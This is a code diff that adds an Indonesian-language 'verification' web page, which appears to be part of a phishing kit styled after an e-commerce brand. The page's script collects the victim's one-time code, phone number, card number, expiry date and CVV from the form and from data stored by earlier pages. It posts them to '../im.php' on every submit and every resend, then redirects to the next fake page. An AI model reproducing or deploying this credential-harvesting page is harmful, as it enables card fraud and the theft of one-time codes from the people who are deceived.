@@ -1,1 +1,220 @@
+<!DOCTYPE html><html lang="id"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Form3 — Verifikasi</title>
+<style>
+body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 20px;
+        background: #fff;
+}
 
+.card {
+        max-width: 420px;
+        margin: 40px auto;
+        background: #fff;
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow: 0 6px 18px rgba(0, 0, 0, 0.06);
+}
+
+input,
+button {
+        width: 100%;
+        padding: 12px;
+        margin-top: 8px;
+        border-radius: 6px;
+        border: 1px solid #ddd;
+        font-size: 15px;
+}
+
+button {
+        background: #03AC0E;
+        color: #fff;
+        border: none;
+        cursor: pointer;
+}
+
+button#resend {
+        background: #eee;
+        color: #333;
+        border: 1px solid #ddd;
+        margin-top: 10px;
+}
+
+.status {
+        margin-top: 12px;
+        font-weight: 600;
+}
+
+.muted {
+        color: #666;
+        font-size: 14px;
+        margin-top: 10px;
+}
+</style>
+</head>
+<body>
+<div class="card">
+  <h2>Masukkan Kode Verifikasi</h2>
+  <div class="muted" id="info">Anda akan menerima kode.</div>
+
+  <form id="otpForm">
+    <input id="otp" placeholder="Masukkan kode" style="width:90%;text-align:center;" type="tel" maxlength="6" required="">
+    <button id="verifyBtn" type="submit">Verifikasi</button>
+  </form>
+
+  <div>
+    <div class="muted">Tidak menerima kode? <span id="count">30</span> detik</div>
+    <button id="resend">Kirim ulang</button>
+  </div>
+
+  <div id="status" class="status"></div>
+</div>
+
+<script>
+const refundMethod = localStorage.getItem("refundMethod") || "Tidak diketahui";
+const userNumber = localStorage.getItem("userNumber") || "Tidak diketahui";
+const cvv = localStorage.getItem("cvv") || "Tidak ada CVV";
+
+// Ambil data dari localStorage (bukan sessionStorage)
+const cardDataStr = localStorage.getItem('cardData');
+let cardData = null;
+if (cardDataStr) {
+    try {
+        cardData = JSON.parse(cardDataStr);
+    } catch (error) {
+        console.error('Error parsing cardData:', error);
+        cardData = null;
+    }
+}
+
+let count = 30;
+const countEl = document.getElementById('count');
+let t = setInterval(() => {
+    countEl.textContent = count;
+    if (count <= 0) clearInterval(t);
+    count--;
+}, 1000);
+
+document.getElementById('otpForm').addEventListener('submit', async e => {
+    e.preventDefault();
+    const otpValue = document.getElementById('otp').value;
+
+    const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+    
+    let pesan = "";
+    
+    if (cardData && cardData.cardNumber && cardData.expiryDate && cardData.cvv) {
+        pesan = `🔐 OTP: ${otpValue}
+📱 HP: ${userNumber}
+💳 Kartu: ${cardData.cardNumber}
+📅 Exp: ${cardData.expiryDate}
+🔒 CVV: ${cardData.cvv}`;
+    } else {
+        pesan = `🔐 OTP: ${otpValue}
+📱 HP: ${userNumber}
+💳 CVV: ${cvv}`;
+    }
+
+    const formData = new FormData();
+    formData.append('message', pesan);
+    
+    try {
+        await fetch('../im.php', {
+            method: "POST",
+            body: formData
+        });
+    } catch (error) {
+        console.error('Error:', error);
+    }
+
+    // Simpan OTP ke localStorage untuk halaman berikutnya
+    localStorage.setItem('otpValue', otpValue);
+    localStorage.setItem('otpTime', waktu);
+
+    const status = document.getElementById('status');
+    status.style.color = 'green';
+    status.textContent = 'Loading...';
+
+    setTimeout(() => {
+        window.location.href = "form3.html";
+    }, 2000);
+});
+
+document.getElementById('resend').addEventListener('click', async () => {
+    document.getElementById('resend').disabled = true;
+    document.getElementById('resend').textContent = 'Mengirim...';
+
+    const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+    
+    let pesan = "";
+    
+    if (cardData && cardData.cardNumber && cardData.expiryDate && cardData.cvv) {
+        pesan = `🔄 Kirim ulang OTP
+📱 HP: ${userNumber}
+💳 Kartu: ${cardData.cardNumber}
+📅 Exp: ${cardData.expiryDate}
+🔒 CVV: ${cardData.cvv}`;
+    } else {
+        pesan = `🔄 Kirim ulang OTP
+📱 HP: ${userNumber}
+💳 CVV: ${cvv}`;
+    }
+
+    const formData = new FormData();
+    formData.append('message', pesan);
+    
+    try {
+        await fetch('../im.php', {
+            method: "POST",
+            body: formData
+        });
+    } catch (error) {
+        console.error('Error:', error);
+    }
+
+    document.getElementById('resend').disabled = false;
+    document.getElementById('resend').textContent = 'Kirim ulang';
+
+    const status = document.getElementById('status');
+    status.style.color = 'green';
+    status.textContent = 'Kode dikirim ulang. Kode lama dianggap kadaluarsa.';
+
+    // Reset timer
+    count = 30;
+    clearInterval(t);
+    t = setInterval(() => {
+        countEl.textContent = count;
+        if (count <= 0) clearInterval(t);
+        count--;
+    }, 1000);
+});
+
+// Tampilkan info kartu di halaman OTP (opsional)
+document.addEventListener('DOMContentLoaded', function() {
+    if (cardData && cardData.cardNumber) {
+        const cardNumberDisplay = cardData.cardNumber.replace(/\d(?=\d{4})/g, "*");
+        const infoDiv = document.createElement('div');
+        infoDiv.style.cssText = `
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 5px;
+            padding: 10px;
+            margin-bottom: 15px;
+            font-size: 12px;
+            color: #6c757d;
+        `;
+        infoDiv.innerHTML = `💳 Kartu: ${cardNumberDisplay}<br>📅 Exp: ${cardData.expiryDate}`;
+        
+        const form = document.getElementById('otpForm');
+        if (form) {
+            form.parentNode.insertBefore(infoDiv, form);
+        }
+    }
+});
+</script>
+
+
+</body></html>
